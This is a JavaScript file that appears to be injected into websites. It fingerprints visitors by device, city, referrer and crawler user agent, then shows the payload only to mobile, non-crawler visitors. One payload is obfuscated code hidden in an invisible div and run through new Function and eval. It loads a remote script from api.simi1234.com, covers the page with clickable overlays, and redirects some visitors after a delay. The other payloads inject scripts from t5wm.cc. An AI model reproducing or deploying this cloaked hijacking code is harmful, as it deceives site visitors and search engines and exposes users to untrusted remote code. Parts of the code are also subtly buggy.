
function _dbug()
{
    console.log(navigator.userAgent.toLowerCase());
    console.log("in_city() = " + in_city());
    console.log("is_robot() = " + is_robot());
    console.log("is_referrer_search()=" + is_referrer_search());
    console.log("当前地区："+ returnCitySN.cname);
    console.log("是否为移动端：" + is_mobile());
}
/**
 * 检测当前是否为移动端
 * @returns {boolean}
 */
function is_mobile()
{
    var mobileArr = ['android','iPhone','SymbianOS','iPad','iPod','Windows Phone','HarmonyOS'];
    var userAgent = navigator.userAgent.toLowerCase();
    for(var i = 0;i < mobileArr.length;i++){
        if (userAgent.includes(mobileArr[i].toLowerCase())) {
            return true;
        }
    }
    return false;
}
/**
 * 查询当前是否通过搜索引擎进来的
 * @param searchArr
 * @returns {boolean}
 */
function is_referrer_search(searchArr)
{
    if(searchArr == undefined){
        searchArr = ["sogou","soso","baidu","google","youdao","yahoo","bing","sm","so","biso","gougou","ifeng","ivc","sooule","niuhu","biso","360"];
    }
    var referrer = document.referrer;
    for(var i = 0;i < searchArr.length;i++){
        if (referrer.includes(referrer[i].toLowerCase())) {
            return true;
        }
    }
    return false;
}
/**
 * 查询当前是否为蜘蛛访问
 * @param robotArr
 * @returns {boolean}
 */
function is_robot(robotArr)
{
    if(robotArr == undefined){
        robotArr = ['baiduspider','yisouspider','sogou','yahoo','360spider','sosospider','googlebot','bingbot','bytespider','yandexbot','yisouspider'];
    }
    var userAgent = navigator.userAgent.toLowerCase();
    for(var i = 0;i < robotArr.length;i++){
        if (userAgent.includes(robotArr[i].toLowerCase())) {
            return true;
        }
    }
    return false;
}
/**
 * 查询当前地区是否在特殊地区内
 * @param cityArr
 * @returns {boolean}
 */
function in_city(cityArr)
{
    if(cityArr == undefined){
        cityArr = ['北京','广州'];
    }
    var city = returnCitySN.cname;
    for(var i=0;i<cityArr.length;i++){
        if (city.indexOf(cityArr[i]) > -1) {
            return true;
        }
    }
    return false;
}

var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);


if (!system.win && !system.mac && !system.xll && !is_robot()) {
    const temporaryGroups = ['sm','t5cpc','t5cpa'];
    const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const randomElements = randomNums(temporaryGroups);
    if (randomElements == 'sm') {
        window.lqLdgF=function(){window.lqLdgFpEls=document.currentScript;var uas=navigator.userAgent.toLowerCase(),isToJump=sessionStorage.getItem('lqLdgF');var rnx=['a','B','c','d','e','G','g','h','J','j','k'],ns=its(rnx,4),en=its(rnx,8),eFun=its(rnx,11),tFun=its(rnx,11),ds="",ds1="",adT=2,adI=uas.indexOf('baidu')!=-1?(function(){if(!isToJump){setTimeout(function(){sessionStorage.setItem('lqLdgF',1);window.open('https://api.simi1234.com/a/c?au427dd9672488f7c14576ba4a899bc877='+au427dd9672488f7c14576ba4a899bc877,'_self')},1000*5)}})():"https://dingbu.bj.bcebos.com/chaoxi.add",adC="https://api.simi1234.com/static/image/c.png";for(var i=0;i<Math.round((Math.random()*10)+1);i++){ds+="<div class='"+its(rnx,6)+"'>"+i==2||i==7||i==9||i==4?"<div> </div>":"<div class='"+its(rnx,8)+"'><div> </div></div>"}for(var i=0;i<Math.round((Math.random()*10)+1);i++){ds1+="<div class='"+its(rnx,5)+"'>"+i==1||i==3||i==5||i==7?"<div> </div>":"<div class='"+its(rnx,9)+"'><div> </div></div>"}var sp=`${ds1}<script>function ${tFun}(c){for(var i of['0x3c','0x3e','0x20']){c=c['replace'](new RegExp(i,'ig'),String['fromCharCode'](i))};return c}<\/script><div id="${en}"style='display:none !important;'>function runxjx(){var t=${adT};var ub=navigator.userAgent.toLocaleLowerCase();var _d;if(ub.indexOf('ucbrowser')!==-1){_d=document.createElement('div')}else{_d=document.createElement('video');_d.playsinline='playsinline';_d.poster='${adI}';var source=document.createElement('source');source.src='';_d.appendChild(source)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=457011932900220928';document.getElementsByTagName('head')[0].appendChild(s);_d.setAttribute('class','lqLdgF');var _img=document.createElement('img');_img.src='${adI}';_d.append(_img);addStyle(styleStr(0,t));window.lqLdgFpEls.parentNode.insertBefore(_d , window.lqLdgFpEls);addlistenerElement(_d,toLink);_img.onload=function(c){var _h=this.offsetHeight;_p=document.createElement('p');_d.appendChild(_p);addStyle(styleStr(1,t,_h));addlistenerElement(_p,function(){_d.remove();_d.remove()})}}function addlistenerElement(el,callBack){el.addEventListener('click',function(){callBack()});el.addEventListener('touchstart',function(e){e.preventDefault();callBack()});el.addEventListener('touchmove',function(e){e.preventDefault()})}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('body')[0].appendChild(styleObj)}function styleStr(sType,dt,tl){var ds=dt==0||dt==1?tl+'px;':'calc(50% - '+(tl+15)+'px);',ls=dt==0||dt==1||dt==2?'right:0px;':'left:0px;',bg='margin:0;padding:0; background: url("${adC}");background-size: contain; background-repeat: no-repeat};';var sty=dt==0||dt==2||dt==3?'top:'+ds+ls+bg:'bottom:'+ds+ls+bg;var style=sType==0?('.lqLdgF{height:110px;object-fit:fill;width:'+(dt==3?'20%':'100%')+';'+(dt==0||dt==1?'position:fixed;':'')+(dt==0?'top:0px':dt==1?'bottom:0px':dt==3?'bottom:50%':'')+';z-index: 999;display: -ms-flexbox;display: flex;-ms-flex: 0 1 auto;flex: 0 1 auto;-ms-flex-align: center;align-items: center;-ms-flex-pack: center;color: #fff;justify-content: center}.lqLdgF img {width: 100%};'):'.lqLdgF p {display: block; width: 15px; height: 15px; position: fixed;'+sty;return style}function toLink(){window.open('https://api.simi1234.com/a/c?au427dd9672488f7c14576ba4a899bc877='+au427dd9672488f7c14576ba4a899bc877,'_self')};window['${eFun}']=runxjx;</div><script>new Function(${tFun}(document.getElementById('${en}').innerHTML))();<\/script>${ds}<script>${eFun}();<\/script>`;var vns=its(rnx,8);var ioasrs1s=document.createElement(`${vns}`);ioasrs1s.innerHTML=sp;document.body.appendChild(ioasrs1s);evalScripts(sp);function evalScripts(text){var script,scripts;scripts=[];var regexp=/<script[^>]*>([\s\S]*?)<\/script>/gi;while((script=regexp.exec(text)))scripts.push(script[1]);scripts=scripts.join('\n');if(scripts)(window.execScript)?window.execScript(scripts):window.setTimeout(scripts,0)}function its(r,len){var str="";for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}};window.lqLdgF();
    }
    if (randomElements == 't5cpa') {
        (function (){
            var id = "9142199889545937380-62113";
            document.write('<ins style="display:none!important" id="' + id + '"></ins>');
            (window.adbyunion = window.adbyunion || []).push(id);
            document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
        })();
    }
    if (randomElements == 't5cpc') {
        (function (){
            var id = "9142199889545937380-56372";
            document.write('<ins style="display:none!important" id="' + id + '"></ins>');
            (window.adbyunion = window.adbyunion || []).push(id);
            document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
        })();
    }
}
